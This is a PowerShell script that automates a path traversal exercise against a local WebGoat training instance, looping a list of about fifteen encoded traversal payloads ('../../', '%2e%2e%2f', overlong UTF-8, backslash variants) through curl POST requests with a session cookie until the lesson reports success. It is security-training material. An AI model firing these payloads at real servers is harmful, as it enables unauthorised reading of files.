# Automated testing for Path Traversal File Retrieval
# Target: path-traversal-secret.jpg (located at C:\Users\mahad\.webgoat-2025.3\)
# Need to traverse from PathTraversal/cats/ to parent of PathTraversal (2 levels up)

$SessionId = "31366EC6E3B179CBE65B1BCCC9B7B3CB"
$baseUrl = "http://localhost:8001/WebGoat/PathTraversal/random"

Write-Host "=== Automated Path Traversal Testing ===" -ForegroundColor Cyan
Write-Host "Target: ../../path-traversal-secret.jpg" -ForegroundColor Yellow
Write-Host ""

# Generate all encoding combinations
$patterns = @(
    # Format: description, pattern
    @("Plain unencoded", "../../path-traversal-secret"),
    @("Forward slashes only", "..%2F..%2Fpath-traversal-secret"),
    @("Dots only", "%2e%2e/%2e%2e/path-traversal-secret"),
    @("All lowercase hex", "%2e%2e%2f%2e%2e%2fpath-traversal-secret"),
    @("All uppercase hex", "%2E%2E%2F%2E%2E%2Fpath-traversal-secret"),
    @("Filename encoded", "../../path%2dtraversal%2dsecret"),
    @("Hyphens and ext encoded", "../../path%2dtraversal%2dsecret%2ejpg"),
    @("Unicode dots", "%u002e%u002e/%u002e%u002e/path-traversal-secret"),
    @("Backslash", "..\..\path-traversal-secret"),
    @("Backslash encoded", "..%5C..%5Cpath-traversal-secret"),
    @("Triple dot", ".../path-traversal-secret"),
    @("Overlong UTF-8 slash", "..%c0%afpath-traversal-secret"),
    @("16-bit Unicode slash", "..%c0%2fpath-traversal-secret"),
    @("Directory listing", ".."),
    @("Current dir", "./cats/../path-traversal-secret")
)

foreach($pattern in $patterns) {
    $desc = $pattern[0]
    $payload = $pattern[1]
    
    try {
        $result = curl.exe -s -X POST $baseUrl `
            -H "Cookie: JSESSIONID=$SessionId" `
            -H "Content-Type: application/x-www-form-urlencoded" `
            --data "id=$payload" 2>$null | ConvertFrom-Json
        
        if($result.lessonCompleted) {
            Write-Host "[SUCCESS] $desc" -ForegroundColor Green
            Write-Host "  Payload: $payload" -ForegroundColor Green
            Write-Host "  Feedback: $($result.feedback)" -ForegroundColor Green
            exit 0
        } else {
            Write-Host "[FAIL] $desc - $payload" -ForegroundColor Red
        }
    } catch {
        Write-Host "[ERROR] $desc - $payload" -ForegroundColor Magenta
    }
}

Write-Host ""
Write-Host "All automated tests failed. This lesson may require:" -ForegroundColor Yellow
Write-Host "  1. Manual browser testing with DevTools" -ForegroundColor White
Write-Host "  2. Checking WebGoat hints/solution button" -ForegroundColor White
Write-Host "  3. Different parameter name (not 'id')" -ForegroundColor White
Write-Host "  4. Special WebGoat-specific encoding" -ForegroundColor White
